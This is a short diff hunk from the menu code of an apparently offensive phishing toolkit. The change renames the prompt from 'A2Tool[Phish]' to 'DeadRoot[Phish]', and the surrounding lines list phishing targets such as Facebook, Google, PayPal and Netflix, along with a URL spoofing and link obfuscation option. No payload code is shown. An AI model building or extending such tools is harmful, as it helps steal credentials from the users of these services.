@@ -165,7 +165,7 @@ def menu():
         print(f"{M}║{W} [15]{R}  URL Spoofing / Link Obfuscation                   {M}║{RS}")
         print(f"{M}║{W} [0]{R}   Back to Main Menu                                  {M}║{RS}")
         print(f"{M}╚══════════════════════════════════════════════════════════════╝{RS}")
-        ch = input(f"\n{Y}  A2Tool[Phish] » {RS}").strip()
+        ch = input(f"\n{Y}  DeadRoot[Phish] » {RS}").strip()
         if ch == '0': break
         elif ch in ['1','2','3','4','5','6','7','8','9','10','11','12']:
             tnames = ['','facebook','google','instagram','twitter','netflix','paypal',
